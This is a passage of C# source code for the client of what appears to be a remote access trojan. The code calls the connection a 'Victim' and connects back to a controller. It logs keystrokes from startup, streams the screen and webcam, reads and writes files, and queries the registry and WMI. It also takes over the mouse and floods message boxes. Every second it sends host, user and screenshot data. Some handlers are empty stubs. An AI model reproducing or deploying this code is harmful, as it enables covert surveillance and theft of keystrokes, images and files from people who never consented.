                                    _Received(v, payload);
                                }
                                else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                {
                                    v.encSend(2, 1, DateTime.Now.ToString("F"));
                                }
                            }
                        }
                    }
                }
                while (recv_len > 0 && is_connected);
            }
            catch (Exception ex)
            {
                is_connected = false;
                return;
            }
        }
        static void _Received(Victim v, string msg)
        {
            try
            {
                string[] cmd = msg.Split('|');
                if (cmd[0] == "detail")
                {
                    if (cmd[1] == "client")
                    {

                    }
                    else if (cmd[1] == "pc")
                    {
                        if (funcInfoPC == null)
                            funcInfoPC = new FuncInfo.PC();

                        if (cmd[2] == "info")
                        {
                            v.encSend(2, 0, "detail|pc|info|" + funcInfoPC.Info());
                        }
                    }
                }
                else if (cmd[0] == "file")
                {
                    if (cmd[1] == "init")
                    {
                        funcFile = new FuncFile();
                        string cp = funcFile.cp;
                        string driver_info = funcFile.GetDrives();
                        v.encSend(2, 0, $"file|init|{cp}|{driver_info}");
                    }
                    else if (cmd[1] == "sd") //SCAN DIR
                    {
                        string dir = cmd[2];
                        int dir_limit = int.Parse(cmd[3]);
                        int file_limit = int.Parse(cmd[4]);
                        string data = funcFile.ScanDir(dir, dir_limit, file_limit);
                        v.encSend(2, 0, $"file|sd|" + dir + "|" + data);
                    }
                    else if (cmd[1] == "goto") //GOTO DIRECTORY
                    {
                        v.encSend(2, 0, $"file|sd|{cmd[2]}|{(Directory.Exists(cmd[2]) ? "1" : "0")}");
                    }
                    else if (cmd[1] == "read")
                    {
                        v.encSend(2, 0, $"file|read|" + funcFile.ReadFile(cmd[2]));
                    }
                    else if (cmd[1] == "write")
                    {
                        string path = Crypto.b64D2Str(cmd[2]);
                        string text = Crypto.b64D2Str(cmd[3]);

                        v.encSend(2, 0, "file|write|" + funcFile.WriteFile(path, text));
                    }
                    else if (cmd[1] == "paste") //PASTE
                    {
                        if (cmd[2] == "cp" || cmd[2] == "mv")
                        {
                            funcFile.PasteFile(cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray(), cmd[4], cmd[2] == "mv");
                        }
                    }
                    else if (cmd[1] == "del") //DELETE
                    {

                    }
                    else if (cmd[1] == "uf") //UPLOAD FILE
                    {

                    }
                    else if (cmd[1] == "df") //DOWNLOAD FILE
                    {

                    }
                    else if (cmd[1] == "zip")
                    {

                    }
                    else if (cmd[1] == "unzip")
                    {

                    }
                }
                else if (cmd[0] == "task")
                {
                    if (cmd[1] == "init")
                    {
                        string data = WMI_Query(Crypto.b64D2Str(cmd[2]));
                        v.encSend(2, 0, "task|init|" + data);
                    }
                    else if (cmd[1] == "start")
                    {

                    }
                    else if (cmd[1] == "kill")
                    {

                    }
                }
                else if (cmd[0] == "reg") //REGISTRY
                {
                    if (funcReg == null)
                        funcReg = new FuncReg();

                    if (cmd[1] == "init") //INITIALIZATION
                    {
                        string data = funcReg.GetRootKeys();
                        v.encSend(2, 0, "reg|init|" + data);
                    }
                    else if (cmd[1] == "item") //SCAN DIRECTORY
                    {
                        string path = Crypto.b64D2Str(cmd[3]);
                        v.encSend(2, 0, $"reg|item|{Path.Combine(cmd[2], path)}|" + funcReg.GetItems(cmd[2], path));
                    }
                    else if (cmd[1] == "goto") //CHECK SPECIFIED PATH EXISTED
                    {
                        string path = Crypto.b64D2Str(cmd[3]);
                        v.encSend(2, 0, $"reg|goto|{Crypto.b64E2Str(Path.Combine(cmd[2], path))}|" + (funcReg.Goto(cmd[2], path) ? "1" : "0"));
                    }
                }
                else if (cmd[0] == "conn")
                {
                    if (funcConn == null)
                        funcConn = new FuncConn();

                    if (cmd[1] == "init")
                    {
                        v.encSend(2, 0, "conn|init|" + funcConn.GetConn());
                    }
                }
                else if (cmd[0] == "serv")
                {
                    if (cmd[1] == "init")
                    {
                        string data = WMI_Query(Crypto.b64D2Str(cmd[2]));
                        v.encSend(2, 0, "serv|init|" + data);
                    }
                }
                else if (cmd[0] == "window")
                {
                    if (funcWindow == null)
                        funcWindow = new FuncWindow();

                    if (cmd[1] == "init")
                    {
                        v.encSend(2, 0, "window|init|" + funcWindow.GetWindow());
                    }
                    else if (cmd[1] == "shot")
                    {
                        string b64_img = funcWindow.Capture(new IntPtr(int.Parse(cmd[2])));
                        v.encSend(2, 0, $"window|shot|{cmd[2]}|" + b64_img);
                    }
                }
                else if (cmd[0] == "shell")
                {

                }
                else if (cmd[0] == "desktop")
                {
                    if (cmd[1] == "init")
                    {
                        DesktopInit(v);
                    }
                    else if (cmd[1] == "start" || cmd[1] == "screenshot")
                    {
                        string[] tmp = cmd[2].Split(',');
                        string device_name = tmp[0];
                        int width = int.Parse(tmp[1]);
                        int height = int.Parse(tmp[2]);

                        if (cmd[1] == "start")
                        {
                            send_screenshot = false;
                            while (!send_stopped)
                                Thread.Sleep(100);

                            send_screenshot = true;
                            send_stopped = false;
                            new Thread(() => DesktopStart(v, device_name, width, height)).Start();
                        }
                        else
                        {
                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + ScreenShot(v, device_name, width, height))).Start();
                        }
                    }
                    else if (cmd[1] == "stop")
                    {
                        send_screenshot = false;
                    }
                }
                else if (cmd[0] == "mouse")
                {
                    if (funcMouse == null)
                        funcMouse = new FuncMouse();

                    if (cmd[1] == "status")
                    {
                        v.encSend(2, 0, $"mouse|status|" + funcMouse.Status());
                    }
                    else if (cmd[1] == "move")
                    {
                        Cursor.Position = new Point(int.Parse(cmd[2]), int.Parse(cmd[3]));
                    }
                    else if (cmd[1] == "click")
                    {
                        FuncMouse.MouseButton btn = (FuncMouse.MouseButton)Enum.Parse(typeof(FuncMouse.MouseButton), cmd[2]);
                        Point ptn = new Point(int.Parse(cmd[3]), int.Parse(cmd[4]));
                        funcMouse.Click(btn, ptn);
                    }
                    else if (cmd[1] == "lock")
                    {
                        funcMouse.Lock();
                    }
                    else if (cmd[1] == "ulock")
                    {
                        funcMouse.Unlock();
                    }
                    else if (cmd[1] == "crazy")
                    {
                        funcMouse.Crazy();
                    }
                    else if (cmd[1] == "calm")
                    {
                        funcMouse.Calm();
                    }
                }
                else if (cmd[0] == "keyboard")
                {
                    if (cmd[1] == "vk")
                    {
                        
                    }
                }
                else if (cmd[0] == "keylogger")
                {
                    if (cmd[1] == "start")
                    {

                    }
                    else if (cmd[1] == "stop")
                    {

                    }
                    else if (cmd[1] == "read")
                    {
                        v.encSend(2, 0, $"keylogger|read|{Crypto.b64E2Str(keylogger.file_keylogger)}|" + Crypto.b64E2Str(keylogger.Read()));
                    }
                }
                else if (cmd[0] == "webcam")
                {
                    if (cmd[1] == "init")
                    {
                        webcam = new Webcam();
                        v.encSend(2, 0, "webcam|init|" + webcam.GetDevices());
                    }
                    else if (cmd[1] == "start" || cmd[1] == "snapshot")
                    {
                        if (webcam != null)
                        {
                            webcam.stop_capture = false;
                            while (!webcam.is_stopped)
                                Thread.Sleep(100);
                        }

                        webcam = new Webcam();
                        webcam.stop_capture = false;
                        webcam.snapshot = (cmd[1] == "snapshot");
                        webcam.v = v;
                        new Thread(() => webcam.StartCapture(int.Parse(cmd[2]))).Start();
                    }
                    else if (cmd[1] == "stop")
                    {
                        if (webcam != null)
                        {
                            webcam.stop_capture = true;
                        }
                    }
                }
                else if (cmd[0] == "fun")
                {
                    if (cmd[1] == "msg")
                    {
                        string mode = cmd[2];
                        string param = cmd[3];

                        string title = Crypto.b64D2Str(cmd[4]);
                        string text = Crypto.b64D2Str(cmd[5]);

                        if (mode == "mul")
                        {
                            for (int i = 0; i < int.Parse(param); i++)
                            {
                                MessageBoxButtons btn = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), cmd[6], true);
                                MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), cmd[7], true);
                                new Thread(() => MessageBox.Show(text, title, btn, icon)).Start();
                            }
                        }
                        else if (mode == "inf")
                        {
                            if (param == "start")
                            {
                                MessageBoxButtons btn = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), cmd[6], true);
                                MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), cmd[7], true);

                                msg_inf = true;
                                while (msg_inf)
                                {
                                    new Thread(() => MessageBox.Show(text, title, btn, icon)).Start();
                                    Thread.Sleep(100);
                                }
                            }
                            else if (param == "stop")
                            {
                                msg_inf = false;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void Shell(Victim v)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="query"></param>
        /// <returns></returns>
        static string WMI_Query(string query)
        {
            List<string> result = new List<string>();
            using (var search = new ManagementObjectSearcher(query))
            {
                using (ManagementObjectCollection coll = search.Get())
                {
                    try
                    {
                        foreach (var device in coll)
                        {
                            List<string> tmp = new List<string>();
                            foreach (PropertyData data in device.Properties)
                            {
                                tmp.Add(Crypto.b64E2Str($"{data.Name};{device[data.Name]}"));
                            }
                            result.Add(Crypto.b64E2Str(string.Join(",", tmp.ToArray())));
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
            }
            return string.Join(",", result.ToArray());
        }
        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        static string[] WMI_QueryNoEncode(string query)
        {
            List<string> result = new List<string>();
            using (var searcher = new ManagementObjectSearcher(query))
            {
                using (ManagementObjectCollection coll = searcher.Get())
                {
                    try
                    {
                        foreach (var device in coll)
                        {
                            foreach (PropertyData data in device.Properties)
                                result.Add(device[data.Name].ToString());
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        return null;
                    }
                }
            }

            return result.ToArray();
        }

        static string BitmapToBase64(Bitmap bitmap)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                byte[] image_bytes = ms.ToArray();
                return Convert.ToBase64String(image_bytes);
            }
        }
        static int FindDesktopIndex(string device_name)
        {
            int idx = 0;
            for (int i = 0; i < Screen.AllScreens.Length; i++)
            {
                if (Screen.AllScreens[i].DeviceName.Equals(device_name, StringComparison.OrdinalIgnoreCase))
                {
                    idx = i;
                    break;
                }
            }

            return idx;
        }
        static string ScreenShot(Victim v, string device_name, int width, int height)
        {
            int idx = FindDesktopIndex(device_name);
            Bitmap bitmap = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
            Rectangle capture_rect = Screen.AllScreens[idx].Bounds;
            Graphics capture_graphics = Graphics.FromImage(bitmap);
            capture_graphics.CopyFromScreen(capture_rect.Left, capture_rect.Top, 0, 0, capture_rect.Size);
            string b64_image = BitmapToBase64(bitmap);

            return b64_image;
        }
        static void DesktopStart(Victim v, string device_name, int width, int height)
        {
            while (is_connected && send_screenshot)
            {
                string b64_img = ScreenShot(v, device_name, width, height);
                v.encSend(2, 0, "desktop|start|" + b64_img);
                //Thread.Sleep(10);
            }
            send_stopped = true;
        }
        static void DesktopInit(Victim v)
        {
            List<string> result = new List<string>();
            foreach (var screen in Screen.AllScreens)
            {
                var bounds = screen.Bounds;
                string name = screen.DeviceName;
                int left = bounds.Left;
                int top = bounds.Top;
                int width = bounds.Width;
                int height = bounds.Height;
                result.Add($"{name},{left},{top},{width},{height}");
            }
            string data = string.Join("+", result.ToArray());
            v.encSend(2, 0, "desktop|init|" + data);
        }

        static string getOS()
        {
            //string result = Environment.OSVersion.ToString();
            string result = null;
            try { result = WMI_QueryNoEncode("select caption from Win32_OperatingSystem")[0]; } catch { }
            if (result == null)
                try { result = RuntimeInformation.OSDescription; } catch { }
            if (result == null)
                try { result = Environment.OSVersion.VersionString; } catch { }

            return result;
        }
        static string getCPU()
        {
            string result = null;
            using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
            {
                // Call NextValue() once to initialize the counter
                cpuCounter.NextValue();
                System.Threading.Thread.Sleep(1000); // Wait for a second to get a valid reading

                // Get CPU usage percentage
                float cpuUsage = cpuCounter.NextValue();
                result = ((int)cpuUsage).ToString() + "%";
            }
            return result;
        }
        static string GetActiveWindowTitle()
        {
            const int nChars = 512;
            StringBuilder sb = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, sb, nChars) > 0)
                return sb.ToString();
            else
                return "";
        }
        static bool isAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        static void SendInfo(Victim v)
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            while (is_connected)
            {
                try
                {
                    string info = string.Join("|", new string[]
                    {
                        "info",
                        Dns.GetHostName(),
                        Environment.UserName,
                        isAdmin() ? "Yes" : "No",
                        getOS(),
                        "", //PING
                        getCPU(), //CPU
                        Screen.AllScreens.Length.ToString(), //MONITOR
                        new Webcam().GetDevices().Split(',').Length.ToString(), //WEBCAM
                        Crypto.b64E2Str(GetActiveWindowTitle()),
                        ScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height),
                    });
                    v.encSend(2, 0, info);
                    Thread.Sleep(1000);
                }
                catch { }
            }
        }

        static void Connect()
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(ip, port);
                Victim v = new Victim(socket);
                //socket.BeginReceive(v.buffer, 0, v.buffer.Length, SocketFlags.None, new AsyncCallback(Received), v);
                new Thread(() => Received(v)).Start();
                is_connected = true;
            }
            catch (SocketException ex)
            {
                return;
            }
        }
        static void Main(string[] args)
        {
            keylogger = new KeyLogger();
            new Thread(() => keylogger.Start()).Start();
            new Thread(() =>
            {
                while (true)
                {
                    if (!is_connected)
                    {
                        Connect();
                    }
                }
            }).Start();
        }
    }
}